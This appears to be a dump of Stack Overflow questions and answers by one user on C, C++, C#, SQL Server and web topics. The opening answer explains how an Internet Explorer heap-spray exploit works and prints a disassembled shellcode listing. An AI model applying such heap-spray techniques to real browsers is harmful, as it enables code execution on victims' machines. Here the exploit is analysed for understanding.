","33708","Mehrdad Afshari","<p>The shellcode contains some x86 assembly instructions that will do the actual exploit. <code>spray</code> creates a long sequence of instructions that will be put in <code>memory</code>. Since we can't usually find out the exact location of our shellcode in memory, we put a lot of <code>nop</code> instructions before it and jump to somewhere there. The <code>memory</code> array will hold the actual x86 code along with the jumping mechanism. We'll feed the crafted XML to the library which has a bug. When it's being parsed, the bug will cause the instruction pointer register to be assigned to somewhere in our exploit, leading to arbitrary code execution.</p>

<p>To understand more deeply, you should actually figure out what is in the x86 code. <code>unscape</code> will be used to put the sequence of bytes represented of the string in the <code>spray</code> variable. It's valid x86 code that fills a large chunk of the heap and jumps to the start of shellcode. The reason for the ending condition is string length limitations of the scripting engine. You can't have strings larger than a specific length.</p>

<p>In x86 assembly, <code>0a0a</code> represents <code>or cl, [edx]</code>. This is effectively equivalent to <code>nop</code> instruction for the purposes of our exploit. Wherever we jump to in the <code>spray</code>, we'll get to the next instruction until we reach the shellcode which is the code we actually want to execute.</p>

<p>If you look at the XML, you'll see <code>0x0a0a</code> is there too. Exactly describing what happens requires specific knowledge of the exploit (you have to know where the bug is and how it's exploited, which I don't know). However, it seems that we force Internet Explorer to trigger the buggy code by setting the <code>innerHtml</code> to that malicious XML string. Internet Explorer tries to parse it and the buggy code somehow gives control to a location of memory where the array exists (since it's a large chunk, the probability of jumping there is high). When we jump there the CPU will keep executing <code>or cl, [edx]</code> instructions until in reaches the beginning of shellcode that's put in memory.</p>

<p>I've disassembled the shellcode:</p>

<pre><code>00000000  C9                leave
00000001  2B1F              sub ebx,[edi]
00000003  B10C              mov cl,0xc
00000005  BDC536DB9B        mov ebp,0x9bdb36c5
0000000A  D9C5              fld st5
0000000C  2474              and al,0x74
0000000E  5A                pop edx
0000000F  F4                hlt
00000010  EA8331FC0B6A6A    jmp 0x6a6a:0xbfc3183
00000017  03D4              add edx,esp
00000019  07                pop es
0000001A  67305CFF          xor [si-0x1],bl
0000001E  98                cwde
0000001F  BBD7FFA4FE        mov ebx,0xfea4ffd7
00000024  9B                wait
00000025  74AD              jz 0xffffffd4
00000027  058B8B028D        add eax,0x8d028b8b
0000002C  D893BCCD35A2      fcom dword [ebx+0xa235cdbc]
00000032  37                aaa
00000033  B84290A63A        mov eax,0x3aa69042
00000038  94                xchg eax,esp
00000039  E99AA4D58D        jmp 0x8dd5a4d8
0000003E  E5A3              in eax,0xa3
00000040  1F                pop ds
00000041  4C                dec esp
00000042  EB46              jmp short 0x8a
00000044  4B                dec ebx
00000045  8CD0              mov eax,ss
00000047  AD                lodsd
00000048  A844              test al,0x44
0000004A  52                push edx
0000004B  4A                dec edx
0000004C  3B81B80DD748      cmp eax,[ecx+0x48d70db8]
00000052  4B                dec ebx
00000053  D46C              aam 0x6c
00000055  46                inc esi
00000056  1392734A204F      adc edx,[edx+0x4f204a73]
0000005C  F8                clc
0000005D  6E                outsb
0000005E  DC8EA20726B4      fmul qword [esi+0xb42607a2]
00000064  04D4              add al,0xd4
00000066  D084ECBA978221    rol byte [esp+ebp*8+0x218297ba],1
0000006D  7CE8              jl 0x57
0000006F  C0CA8C            ror dl,0x8c
00000072  F4                hlt
00000073  A6                cmpsb
00000074  47                inc edi
00000075  210D2EA0B0CD      and [0xcdb0a02e],ecx
0000007B  2CA8              sub al,0xa8
0000007D  B05B              mov al,0x5b
0000007F  43                inc ebx
00000080  F4                hlt
00000081  24E8              and al,0xe8
00000083  7A9C              jpe 0x21
00000085  BB857DCBA0        mov ebx,0xa0cb7d85
0000008A  7DED              jnl 0x79
0000008C  92                xchg eax,edx
0000008D  09E1              or ecx,esp
0000008F  96                xchg eax,esi
00000090  315580            xor [ebp-0x80],edx
</code></pre>

<p>Understanding this shellcode requires x86 assembly knowledge and the problem in the MS library itself (to know what the system state is when we reach here), not JavaScript! This code will in turn execute <code>calc.exe</code>.</p>
"
"<p>I'm trying to write out a  <code>Byte[]</code> array representing a complete file to a file.</p>

<p>The original file from the client is sent via TCP and then received by a server. The received stream is read to a byte array and then sent to be processed by this class. </p>

<p>This is mainly to ensure that the receiving <code>TCPClient</code> is ready for the next stream and separate the receiving end from the processing end. </p>

<p>The <code>FileStream</code> class does not take a byte array as an argument or another Stream object ( which does allow you to write bytes to it).</p>

<p>I'm aiming to get the processing done by a different thread from the original ( the one with the TCPClient). </p>

<p>I don't know how to implement this, what should I try?</p>
","33708","Mehrdad Afshari","<p>Yep, why not?</p>

<pre><code>fs.Write(myByteArray, 0, myByteArray.Length);
</code></pre>
"
"<p>As Joel points out in <a href=""http://blog.stackoverflow.com/2008/12/podcast-34/"">Stack Overflow podcast #34</a>, in <a href=""http://rads.stackoverflow.com/amzn/click/0131103628"">C Programming Language</a> (aka: K &amp; R), there is mention of this property of arrays in C: a[5] == 5[a]</p>

<p>Joel says that it's because of pointer arithmetic but I still don't understand. Why does <code>a[5] == 5[a]</code> ?</p>
","33708","Mehrdad Afshari","<p>The C standard defines the <code>[]</code> operator as follows:</p>

<p><code>a[b] == *(a + b)</code></p>

<p>Therefore <code>a[5]</code> will evaluate to:</p>

<pre><code>*(a + 5)
</code></pre>

<p>and <code>5[a]</code> will evaluate to:</p>

<pre><code>*(5 + a)
</code></pre>

<p>and from elementary school math we know those are equal.</p>

<p>This is the direct artifact of arrays behaving as pointers, ""<code>a</code>"" is a memory address. ""<code>a[5]</code>"" is the value that's 5 <strong>elements</strong> further from ""<code>a</code>"". The address of this element is ""<code>a + 5</code>"". This is equal to offset ""<code>a</code>"" from ""<code>5</code>"" elements at the beginning of the address space (<code>5 + a</code>).</p>
"
"<p>In our C++ course they suggest not to use C++ arrays on new projects anymore. As far as I know Stroustroup himself suggests not to use arrays. But are there significant performance differences?</p>
","33708","Mehrdad Afshari","<p>STL is a heavily optimized library. In fact, it's even suggested to use STL in games where high performance might be needed. Arrays are too error prone to be used in day to day tasks. Today's compilers are also very smart and can really produce excellent code with STL. If you know what you are doing, STL can usually provide the necessary performance. For example by initializing vectors to required size (if you know from start), you can basically achieve the array performance. However, there might be cases where you still need arrays. When interfacing with low level code (i.e. assembly) or old libraries that require arrays, you might not be able to use vectors. </p>
"
"<p>I just finished reading a book on scala. What strikes me is that every single example in the whole book was numerical in some form or another.</p>

<p>Like a lot of programmers, the only math I use is from discrete and combinatorial mathematics, and usually that's not math I program in an explicit way. I'm really missing some compelling examples of functional alternatives/supplements to regular oo algorithms.</p>

<p>What are some non-numerical use-cases for functional programming ?</p>
","33708","Mehrdad Afshari","<p>Pattern matching is also a place where functional programming shines, making it really useful in areas such as Bioinformatics.</p>

<p>However, given great compilers we have today, functional programming shines nearly everywhere.</p>
"
"<p>I have a website that's running on a Windows server and I'd like to add some scheduled background tasks that perform various duties. For example, the client would like users to receive emails that summarize recent activity on the site. </p>

<p>If sending out emails was the only task that needed to be performed, I would probably just set up a scheduled task that ran a script to send out those emails. However, for this particular site, the client would like a variety of different scheduled tasks to take place, some of them always running and some of them only running if certain conditions are met. Right now, they've given me an initial set of things they'd like to see implemented, but I know that in the future there will be more. </p>

<p>What I am wondering is if there's a simple solution for Windows that would allow me to define the tasks that needed to be run and then have one scheduled task that ran daily and executed each of the scheduled tasks that had been defined. Is a batch file the easiest way to do this, or is there some other solution that I could use?</p>
","33708","Mehrdad Afshari","<p>Use the Windows Scheduled Tasks or create a Windows Service that does the scheduling itself.</p>
"
"<p>How does container object like vector in stl get destroyed even though they are created in heap?</p>

<p><strong>EDIT</strong></p>

<p>If the container holds pointers then how to destroy those pointer objects</p>
","33708","Mehrdad Afshari","<p>When a vector goes out of scope, the compiler issues a call to its destructor which in turn frees the allocated memory on the heap.</p>
"
"<p>I find this comes up a lot, and I'm not sure the best way to approach it. </p>

<p><strong>The question I have is how to make the decision between using foreign keys to lookup tables, or using lookup table values directly in the tables requesting it, avoiding the lookup table relationship completely.</strong></p>

<p><strong>Points to keep in mind:</strong></p>

<ul>
<li><p>With the second method you would
need to do mass updates to all
records referencing the data if it
is changed in the lookup table.</p></li>
<li><p>This is focused more
towards tables that have a lot of
the column's referencing many lookup
tables.Therefore lots of foreign
keys means a lot of
joins every time you query the
table.</p></li>
<li>This data would be coming from drop
down lists which would be pulled
from the lookup tables. In order to match up data when reloading, the values need to be in the existing list (<em>related to the first point</em>).</li>
</ul>

<p>Is there a best practice here, or any key points to consider?</p>

<hr>

<p>Great answers guys, I'm going to keep this open a bit longer for discussion, and see what other feedback we can get.</p>
","33708","Mehrdad Afshari","<p>Rule of thumb: Normalize the database, benchmark and denormalize only if required to achieve good performance. Never denormalize without benchmarking.</p>

<p>If you had to denormalize, always preserve integrity of data using constraints and triggers.</p>
"
"<p>In the Best Practices to improve web site Performance <a href=""http://developer.yahoo.com/performance/rules.html"">http://developer.yahoo.com/performance/rules.html</a>, Steve Souders mentioned one rule ""Move Scripts to the Bottom"". It's a little confusing. Actually, I notice that a lot of web pages that doesn't put script at bottom, while <a href=""http://developer.yahoo.com/yslow/"">YSlow</a> still mark A for these pages. </p>

<p>So, when should I follow the rule ""Put Scripts at the Bottom""?</p>
","33708","Mehrdad Afshari","<p>Sometimes, you have no choice but to put scripts at a specific location in page. However, if you put scripts at the bottom of the page, the browser won't interrupt its rendering to load JS engine to process your script (which might be costly, if you have loops running for large number of times) and will probably display an early view of the page sooner.</p>
"
"<p>I need to transfer data from one table to the same table in another server which has been truncated. Can somebody please, let me know the easiest way to do it. Please, help me.</p>

<p>Thanks,
Chris</p>
","33708","Mehrdad Afshari","<p>Use the SQL Server Import and Export wizard. It's probably the easiest way to accomplish this task.</p>

<p>For more advanced data transfer, consider using <code>bcp</code> utility, <code>BULK INSERT</code> statement and <code>OPENDATASOURCE</code>.</p>
"
"<p>while diassembling the .Net Source Code using Reflector, I came upon the Equals implementation in the Object Class and it refers to </p>

<pre><code>bool InternalEquals(object objA, object objB);
</code></pre>

<p>Which again refers to </p>

<pre><code>internal static extern bool InternalEquals(object objA, object objB);
</code></pre>

<p>I am now confused regarding where to find the implementation of this <code>InternalEquals(object objA, object objB)</code> function and how is it using this function and in which .Net assembly is this function defined and also if each and everything is written from scratch for the .Net Source Code, then why I am unable to find this function's implementation.</p>

<p>Kindly please help me in this..
Thanking You</p>
","33708","Mehrdad Afshari","<p>It's declared as <code>[MethodImpl(MethodImplOptions.InternalCall)]</code>. It means that it's implemented in the CLR itself, as a native procedure, not a .NET assembly.</p>

<p>You can view a similar CLR source code by looking at <a href=""http://www.microsoft.com/downloads/details.aspx?FamilyId=8C09FD61-3F26-4555-AE17-3121B4F51D4D&amp;displaylang=en"" rel=""nofollow"">Microsoft SSCLI (aka Rotor)</a>.</p>

<p>In SSCLI 2.0 it's implemented as (in <code>sscli20/clr/src/vm/comobject.cpp</code>):</p>

<pre><code>FCIMPL2(FC_BOOL_RET, ObjectNative::Equals, Object *pThisRef, Object *pCompareRef)
{
    CONTRACTL
    {
        THROWS;
        DISABLED(GC_NOTRIGGER);
        INJECT_FAULT(FCThrow(kOutOfMemoryException););
        MODE_COOPERATIVE;
        SO_TOLERANT;          
    }
    CONTRACTL_END;

    if (pThisRef == pCompareRef)    
        FC_RETURN_BOOL(TRUE);

    // Since we are in FCALL, we must handle NULL specially.
    if (pThisRef == NULL || pCompareRef == NULL)
         FC_RETURN_BOOL(FALSE);

    MethodTable *pThisMT = pThisRef-&gt;GetMethodTable();

    // If it's not a value class, don't compare by value
    if (!pThisMT-&gt;IsValueClass())
         FC_RETURN_BOOL(FALSE);

    // Make sure they are the same type.
    if (pThisMT != pCompareRef-&gt;GetMethodTable())
        FC_RETURN_BOOL(FALSE);

    // Compare the contents (size - vtable - sink block index).
    BOOL ret = memcmp(
        (void *) (pThisRef+1), 
        (void *) (pCompareRef+1), 
        pThisRef-&gt;GetMethodTable()-&gt;GetBaseSize() - sizeof(Object) - sizeof(int)) == 0;

    FC_GC_POLL_RET();

    FC_RETURN_BOOL(ret);
}
FCIMPLEND
</code></pre>
"
"<p>On a site with a high number of users, should paging be handled in code, or with a stored procedure.  If you have employed caching, please include your success factors.</p>
","33708","Mehrdad Afshari","<p>Personally, I never page stuff outside SQL Server. I do this at database level as if you have a million records to be paged, if you retrieve it in application layer and page it there, you are already paying a <b>huge</b> cost.</p>
"
"<p>This is kind of related to <a href=""http://stackoverflow.com/questions/147801/best-way-to-parse-float"">my previous</a> question, but not really.
I have an input of which I don't know the culture. So it can both use ',' and '.' as separator for the fraction. The number will never be >5 though, so we can be rather sure if there's a separator, it will be for the fraction.</p>

<p>I was looking at the <code>TryParse</code> method. It accepts a <code>NumberStyles</code> argument. But I don't see anything about fraction separator or the like..</p>

<p>Am I missing something again or is there a better way to reach my goal?</p>
","33708","Mehrdad Afshari","<p>Try this:</p>

<pre><code>float.TryParse(myString.Replace(',', '.'), out myfloat);
</code></pre>

<p><b>EDIT</b>: as Jon mentioned, the following way is recommended:</p>

<pre><code>float.TryParse(myString.Replace(',', '.'), 
               System.Globalization.NumberStyles.Float, 
               System.Globalization.NumberFormatInfo.InvariantInfo, 
               out myFloat);
</code></pre>
"
"<p>I am looking the fastest way to draw thousands of individually calculated pixels directly to the screen in an iPhone application that preforms extremely well.</p>
","33708","Mehrdad Afshari","<p>Why don't you use OpenGL views?</p>
"
"<p>I'm looking into writing a simple synchronization ability into my app and one of the concerns that has popped up is synchronization of time between two remote computers, each with their own clock (in particular concerning the modification dates of files/objects).</p>

<p>I'm sure a lot of research has been done on this topic and don't want to get too theoretical, but I'm wondering if there are any accepted best practices for minimizing temporal discrepancies between remote clocks?</p>

<p>For example, a start is to always use universal time (UTC) as that avoids timezone problems, but there is no guarantee that two computers will have exactly the same system time. Luckily the work I'm doing isn't very fine-grained, so it's not a terribly important concern, but I'm still curious nonetheless.</p>

<p>One solution would be to always use the same clock on both ends, such as a global time server, rather than the local system clock. Presumably this (combined with shared resource locks) could guarantee no accidental overlap of synchronized time, but it's not very practical.</p>

<p>One thought that just popped into my head would be to synchronize each node (each client) with an offset calculated at some point prior, perhaps by calculating the offset of the system clock with a global time server. This would only need to be done occasionally as the offset itself would not likely change greatly over a short period of time.</p>

<p><strong>Update:</strong> Let me just add that I'm not interested in actually synchronizing the system clocks of two computers--I'll presume that the operating system will handle this in most cases. This is just a question of how to ensure two instances of an application are using synchronized times, though in this day and age I suppose the system clocks would almost assuredly be synchronized to within some very small delta anyway.</p>
","33708","Mehrdad Afshari","<p>Look at ""<a href=""http://en.wikipedia.org/wiki/Network_Time_Protocol"" rel=""nofollow"">Network Time Protocol</a>"" (NTP) specification.</p>
"
"<p>I have a condition in which I need to close the application and so I call this.Dispose() when I set a certian flag. </p>

<p>At first I thought it was a problem of calling functions after I call this.Dispose() and so I moved the code to be the last thing called, but I still get a ""ArgumentException was unhandled"" ""Parameter is not valid."" on the Application.Run(new myApp()); line. </p>

<p>What am I doing wrong? Did I miss something along the way? Or maybe there is a better way to close the application? Thanks for the help in advance.</p>
","33708","Mehrdad Afshari","<p>Try using <code>Application.Exit()</code> to exit the application.</p>

<p>When you use <code>Application.Run(new MyForm());</code>, a message loop is created on the thread using the form object as the main form. It tries to deliver Win32 messages that are coming to the application to their respective objects. However, when you call <code>Dispose()</code> on the form object, you haven't exited the message loop yet. When it tries to deliver the next message to your form object, it fails since it's already disposed and throws the exception. You should either request the form to be closed (by calling <code>Close</code> on the form), which will then ask the form to process the event and if completed, exit the message loop afterwards. The other way (more direct way) is to shut down the message loop on the thread altogether by calling <code>Application.Exit()</code> which will cause all related forms to be closed.</p>
"
"<p>Is there a way to (ab)use the C preprocessor to emulate namespaces in C?</p>

<p>I'm thinking something along these lines:</p>

<pre><code>#define NAMESPACE name_of_ns
some_function() {
    some_other_function();
}
</code></pre>

<p>This would get translated to:</p>

<pre><code>name_of_ns_some_function() {
    name_of_ns_some_other_function();
}
</code></pre>
","33708","Mehrdad Afshari","<p>You could use the ## operator:</p>

<pre><code>#define FUN_NAME(namespace,name) namespace ## name
</code></pre>

<p>and declare functions as:</p>

<pre><code>void FUN_NAME(MyNamespace,HelloWorld)()
</code></pre>

<p>Looks pretty awkward though.</p>
"
"<p>Is there any way to have a Windows batch file directly input SQL statements without calling a script?  I want the batch file to login to SQL and then enter in the statements directly.</p>

<p><strong>EDIT:</strong> I'm using Oracle v10g</p>
","33708","Mehrdad Afshari","<p>To run something on SQL server 2005/2008, you could use <code>sqlcmd</code> command line utility. <code>sqlcmd -h</code> prints the list of switches.</p>
"
"<p>You knows that IPhone in other country like China mainland always be hacked when it buy from reseller. Can I develop custom app by official SDK on a hacked IPhone ?</p>
","33708","Mehrdad Afshari","<p>Yes, you can use Xcode to develop and debug your app on a jailbroken iPhone. You don't even need to pay the $99 to do that.</p>
"
"<p>I was listening to the Hansel Minutes podcast from 11/24 talking about Moonlight.</p>

<p>To paraphrase, Scott made the comment that Microsofts attitude about open source is quickly changing, especially with the adoption of MVC architecture.</p>

<p>I admit I don't have the best 'big picture' grasp of what MVC means to the developement world, but specifically I want to know how does it benefit open source communities?</p>
","33708","Mehrdad Afshari","<p>In fact, MVC itself does not seem to have anything to do with open source specifically except that Ruby on Rails is inspired by it which is something that open source developers use and like. The primary thing about MVC and Microsoft open source strategy is that ASP.NET MVC, which is probably going to be an important thing for Microsoft, is released as open source software and it's being developed within the community.</p>
"
"<p>I was wondering if there's a way (even a manual one) to setup an ASP.NET MVC project with unit tests under Visual Web Developer Express 2008 SP1.</p>
","33708","Mehrdad Afshari","<p>Visual Web Developer does not support C# test projects, which essentially a ASP.NET MVC test project is. However you can test your application with Visual C# Express referencing the assembly containing the models and controllers.</p>
"
"<p>Is there any way to access the <code>&lt;compilation /&gt;</code> tag in a web.config file?</p>

<p>I want to check if the ""<em>debug</em>"" attribute is set to ""<em>true</em>"" in the file, but I can't seem to figure out how to do it. I've tried using the <code>WebConfigurationManager</code>, but that doesn't seem to allow me to get to the <code>&lt;compilation /&gt;</code> section.</p>

<p><strong>Update:</strong></p>

<p>I know I could easily just load the file like an XML Document and use XPath, but I was hoping there was already something in the framework that would do this for me. It seems like there would be something since there are already ways to get App Settings and Connection Strings.</p>

<p>I've also tried using the <code>WebConfigurationManager.GetSection()</code> method in a few ways:  </p>

<pre><code>WebConfigurationManager.GetSection(""compilation"")// Name of the tag in the file
WebConfigurationManager.GetSection(""CompilationSection"") // Name of the class that I'd expect would be returned by this method
WebConfigurationManager.GetSection(""system.web"") // Parent tag of the 'compilation' tag
</code></pre>

<p>All of the above methods return <code>null</code>. I'm assuming there is a way to get to this configuration section since there is a class that already exists ('<code>CompilationSection</code>'), I just can't figure out how to get it.</p>
","33708","Mehrdad Afshari","<p>After all, you can always load up the <code>Web.config</code> file into an <code>XmlDocument</code> and use an <code>XPath</code> query to find out!</p>

<pre><code>XmlDocument doc = new XmlDocument();
doc.Load(Server.MapPath(""~/Web.config""));     
doc.SelectSingleNode(""/configuration/system.web/compilation/@debug"");
</code></pre>

<p>However, I suggest you use the <code>Configuration.GetSection</code> method for solution.</p>

<pre><code>CompilationSection section = 
    Configuration.GetSection(""system.web/compilation"") as CompilationSection;
bool debug = section != null &amp;&amp; section.Debug;
</code></pre>
"
"<p>There have been several questions recently about database indexing and clustered indexing and it has been kind of new to me until the last couple weeks. I was wondering how important it is and what kind of performance gains can be expected from creating them.</p>

<p><strong>Edit:</strong> What is usually the best type of fields to look at when putting in a clustered index when you are first starting out?</p>
","33708","Mehrdad Afshari","<p><b>Very very<sup><a href=""http://en.wikipedia.org/wiki/Ackermann_function"">A</a>(<a href=""http://en.wikipedia.org/wiki/Graham%27s_number"">G</a>,<a href=""http://en.wikipedia.org/wiki/Graham%27s_number"">G</a>)</sup> important</b>. In my opinion, wise indexing is the absolute most important thing in DB performance optimization.</p>

<p>This is not an easy topic to cover in a single answer. Good indexing requires knowledge of queries going to happen on the database, making a large number of trade-offs and understanding the implication of a specific index in the specific DB engine. But it's very important nevertheless.</p>

<p><b>EDIT:</b> Basically, clustered indexes usually should have short lengths. They should be created on queries which reflect a range. They should not have duplicate entries. But these guidelines are very general and by no means the right thing. The right thing is to analyze the queries that are gonna be executed. Carefully benchmarking and analyzing execution plans and understanding what is the best way to do it. This requires years of experience and knowledge and by no means it's something to explain in a single paragraph. It's the primary thing that makes DB experts expert (It's not the only thing, but it's primitive to other important things, such as concurrency issues, availability, ...)!</p>
"
"<p>I would like to use RNGCryptoServiceProvider as my source of random numbers. As it only can output them as an array of byte values how can I convert them to 0 to 1 double value while preserving uniformity of results?</p>
","33708","Mehrdad Afshari","<pre><code>byte[] result = new byte[8];
rng.GetBytes(result);
return (double)BitConverter.ToUInt64(result,0) / ulong.MaxValue;
</code></pre>
"
"<p>Creating an OS seems like  a <strong>massive</strong> project.  How would anyone even get started?</p>

<p><strong>For example, when I pop Ubuntu into my drive, how can my computer just <em>run</em> it?</strong>
(This, I guess, is what I'd really like to know.)</p>

<p>Or, looking at it from another angle, what is the least amount of bytes that could be on a disk and still be ""run"" as an OS?</p>

<p>(I'm sorry if this is vague.  I just have <em>no idea</em> about this subject, so I can't be very specific.  I pretend to know a fair amount about how computers work, but I'm utterly clueless about this subject.)</p>
","33708","Mehrdad Afshari","<p>Basically, there are many arguments about what an OS actually <i>is</i>. If you got everyone agreed on what an OS specifically is (is it just the kernel? everything that runs in kernel mode? is the shell part of OS? is X part of OS? is Web browser a part of OS?), your question is answered! Otherwise, there's no specific answer to your question.</p>
"
"<p>Is is that I'm a newbie learning Ruby, or does it really have more ways to write (the same) things than Java/C#? Also, if it is more flexible than Java, are there any linguistic features of Ruby that are generally <strong>not</strong> used to avoid confusion?</p>

<p>Examples might be parallel assignment and all the different ways to write Strings, perhaps?</p>

<p><strong>Note:</strong> I'm not asking for a comparison with Java/C#... just this language question, please...</p>

<p><strong>Edit:</strong> I understand that C#, Java and Ruby are strongly typed, and that only Ruby (like Python and others) is dynamically typed (while Java/C# are statically typed). Some of the answers say that dynamically-typed languages are more flexible. Is this necessarily true, and how does it affect syntax? <strong>I am only asking about syntactic flexibility.</strong> </p>

<p>(PHP is also dynamically typed and it does <strong>not</strong> seem more flexible than Java/C#, as far as I've seen. Again, I mean in terms of syntax, not in terms of deployment nor any other aspect...)</p>
","33708","Mehrdad Afshari","<p>Ruby is a dynamic language. C# and Java are both statically typed language with strong typing. C# in v4.0 will add dynamic features but till now, Java and C# have had a completely different and more strict paradigm than dynamic languages such as Ruby and Python.</p>
"
"<p>I have been used to do some refactorings by introducing compilation errors. For example, if I want to remove a field from my class and make it a parameter to some methods, I usually remove the field first, which causes a compilation error for the class. Then I would introduce the parameter to my methods, which would break callers. And so on. This usually gave me a sense of security. I haven't actually read any books (yet) about refactoring, but I used to think this is a relatively safe way of doing it. But I wonder, is it really safe? Or is it a bad way of doing things?</p>
","33708","Mehrdad Afshari","<p>It's a pretty common way I think, as it finds all references to that specific thing. However modern IDEs such as Visual Studio have Find All References feature which makes this unnecessary.</p>

<p>However, there are some disadvantages to this approach. For large projects, it might take a long time to compile the application. Also, don't do this for a long time (I mean, put things back working as soon as possible) and don't do this for more than one thing at a time as you might forget the correct way you patched things up at the first time.</p>
"
"<p>How to protect a SQL Server database from viewing others?</p>
","33708","Mehrdad Afshari","<p>By setting up user accounts and passwords, assigning appropriate roles to them, and keeping them safe and secure :)</p>

<p>Check out <code>CREATE LOGIN</code>, <code>DROP LOGIN</code> (SQL Server 2005), <code>sp_grantdbaccess</code>, <code>sp_revokedbaccess</code>, <code>sp_grantlogin</code>, <code>sp_droplogin</code>, <code>sp_addlogin</code>, <code>GRANT</code>, <code>DENY</code>, <code>REVOKE</code> statements for more information.</p>
"
"<p>Does anyone know if viewstate is available when using ICallbackEventHandler?
If not is there any work around to get it?
Thanks.</p>
","33708","Mehrdad Afshari","<p>ViewState is available to be read, but you cannot update it.</p>

<p>You might wanna check this out for idea of a workaround: <a href=""http://www.reimers.dk/blogs/jacob_reimers_weblog/archive/2007/03/23/tweaking-the-icallbackeventhandler-and-viewstate.aspx"" rel=""nofollow"">http://www.reimers.dk/blogs/jacob_reimers_weblog/archive/2007/03/23/tweaking-the-icallbackeventhandler-and-viewstate.aspx</a></p>
"
"<p>What is it best to handle pagination? Server side or doing it dynamically using javascript?</p>

<p>I'm working on a project which is heavy on the ajax and pulling in data dynamically, so I've been working on a javascript pagination system that uses the dom - but I'm starting to think it would be better to handle it all server side.</p>

<p>What are everyone's thoughts?</p>
","33708","Mehrdad Afshari","<p>Doing it on client side will make your user download all the data at first which might not be needed, and will remove the primary benefit of pagination.</p>

<p>The best way to do so for such kind of AJAX apps is to make AJAX call the server for next page and add update the current page using client side script.</p>
"
"<p>I'm loading an assembly at runtime and the question that arises everytime I call the code is that should I be checking if that particular assembly has loaded already? or does .Net take care of this and one assembly (same version) can only be loaded once? The basic question here is do i have to iterate through a list of loaded assemblies and see if my assembly was already loaded or not?
Thanks</p>
","33708","Mehrdad Afshari","<p>To quote <a href=""http://msdn.microsoft.com/en-us/library/1009fa28.aspx"">MSDN</a>: ""If an assembly with the same identity is already loaded, LoadFrom returns the loaded assembly even if a different path was specified. ""</p>
"
"<p>What's the best way to put the ""debugger;"" statement inside the __doPostBack method or a way to step in the method?</p>
","33708","Mehrdad Afshari","<p>You can manually attach to the <code>iexplore.exe</code> process as Script debugger and set the breakpoint accordingly <b><i>on generated page</i></b>. Or you could break into debugger anytime by selecting the option from menu if you had enabled script debugging in advanced tab in Internet options</p>
"
"<p>My kindergarten SQL Server taught me that a trigger may be fired with multiple rows in the inserted and deleted pseudo tables. I mostly write my trigger code with this in mind, often resulting in some cursor based cludge. Now I'm really only able to test them firing for a single row at a time. How can I generate a multirow trigger and will SQL Server actually ever send a multirow trigger? Can I set a flag so that SQL Server will only fire single row triggers??</p>
","33708","Mehrdad Afshari","<p>Yes, if a statement affects more than one row, it should be handled by a single trigger call, as you might want to revert the whole transaction. It is not possible to split it to separate trigger calls logically and I don't think SQL Server provides such a flag. You can make SQL Server call your trigger with multiple rows by issuing an UPDATE or DELETE statement that affects multiple rows.</p>
"
"<p>I am working with a custom role provider in asp.net and it appears that once the provider is loaded into memory, it doesn't drop out of memory until the web application is restarted (like when the web.config file is changed and saved). Further, all of the requests to that web application seem to utilize the one instance of the role provider.</p>

<p>So my question is: When does asp.net create instances of role providers? And what is their life span? When does asp.net create new instances? <strong>And is there a way to force asp.net to refresh the current provider instance by dropping the old instance and creating a new one?</strong></p>
","33708","Mehrdad Afshari","<p>The design of ASP.NET assumes the providers are stateless objects. Therefore, you should design your provider in a manner that you won't need to know about when it is created and when it dies. Basically, if you really want to do that, you could put the actual logic in a different class that its creation and disposal will be handled by a proxy class that you introduce to ASP.NET.</p>

<p>Also, ASP.NET does not guarantee when it will create the role provider object. It's something like static constructors. You should only rely on the fact that they do exist whenever they are needed.</p>
"
"<p>Years ago I learned the hard way about precision problems with floats so I quit using them.  However, I still run into code using floats and it make me cringe because I know some of the calculations will be inaccurate.</p>

<p>So, when is it appropriate to use a float?</p>

<p><strong>EDIT:</strong>
As info, I don't think that I've come across a program where the accuracy of a number isn't important.  But I would be interested in hearing examples.</p>
","33708","Mehrdad Afshari","<p>There are many cases you would want to use a <code>float</code>. What I don't understand however, is what you can use instead. If you mean using <code>double</code> instead of <code>float</code>, then yeah, in most cases, you want to do that. However, <code>double</code> will also have precision issues. You should use <code>decimal</code> whenever the accuracy is important. </p>

<p><code>float</code> and <code>double</code> are very useful in many applications. <code>decimal</code> is an expensive data type and its range (the magnitude of the largest number it can represent) is less than <code>double</code>. Computers usually have special hardware level support for those data types. They are used <b>a lot</b> in scientific computing. Basically, they are primary fractional data types you want to use. However, in monetary calculations, where precision is extremely important, <code>decimal</code> is the way to go.</p>
"
"<p>I have a byte array that represents a complete TCP/IP packet.  For clarification, the byte array is ordered like this:</p>

<p>(IP Header - 20 bytes)(TCP Header - 20 bytes)(Payload - X bytes)</p>

<p>I have a <code>Parse</code> function that accepts a byte array and returns a <code>TCPHeader</code> object.  It looks like this:</p>

<pre><code>TCPHeader Parse( byte[] buffer );
</code></pre>

<p>Given the original byte array, here is the way I'm calling this function right now.</p>

<pre><code>byte[] tcpbuffer = new byte[ 20 ];
System.Buffer.BlockCopy( packet, 20, tcpbuffer, 0, 20 );
TCPHeader tcp = Parse( tcpbuffer );
</code></pre>

<p>Is there a convenient way to pass the TCP byte array, i.e., bytes 20-39 of the complete TCP/IP packet, to the <code>Parse</code> function without extracting it to a new byte array first?</p>

<p>In C++, I could do the following:</p>

<pre><code>TCPHeader tcp = Parse( &amp;packet[ 20 ] );
</code></pre>

<p>Is there anything similar in C#?  I want to avoid the creation and subsequent garbage collection of the temporary byte array if possible.</p>
","33708","Mehrdad Afshari","<p>If you really need these kind of control, you gotta look at <code>unsafe</code> feature of C#. It allows you to have a pointer and pin it so that GC doesn't move it:</p>

<pre><code>fixed(byte* b = &amp;bytes[20]) {
}
</code></pre>

<p>However this practice is not suggested for working with managed only code if there are no performance issues. You could pass the offset and length as in <code>Stream</code> class.</p>
"
"<p>What is the correct way of iterating over a vector in C++?</p>

<p>Consider these two code fragments, this one works fine:</p>

<pre><code>for (unsigned i=0; i &lt; polygon.size(); i++) {
    sum += polygon[i];
}
</code></pre>

<p>and this one:</p>

<pre><code>for (int i=0; i &lt; polygon.size(); i++) {
    sum += polygon[i];
}
</code></pre>

<p>which generates <code>warning: comparison between signed and unsigned integer expressions</code>.</p>

<p>I'm new in the world of C++, so the <code>unsigned</code> variable looks a bit frightening to me and I know <code>unsigned</code> variables can be dangerous if not used correctly, so - is this correct?</p>
","33708","Mehrdad Afshari","<pre><code>for (vector&lt;int&gt;::iterator it = polygon.begin(); it != polygon.end(); it++)
    sum += *it;
</code></pre>
"
"<p>Is there a way in Cocoa that is currently considered best practice for creating a multi-tier or client server application?</p>

